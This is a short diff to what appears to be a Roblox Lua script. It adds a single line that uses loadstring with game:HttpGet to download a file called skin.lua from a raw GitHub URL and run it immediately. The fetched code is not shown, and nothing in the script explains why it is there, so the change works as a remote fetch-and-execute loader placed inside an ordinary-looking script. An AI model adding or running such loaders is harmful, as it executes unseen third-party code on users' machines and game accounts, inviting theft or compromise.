@@ -3,6 +3,10 @@
 
 wait(1)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/triple7distro/triple7/refs/heads/main/ee/skin.lua"))()
+
+wait(1)
+
 local e1_001 = game:GetService("Players")
 local e1_002 = game:GetService("RunService")
 local e1_003 = game:GetService("UserInputService")
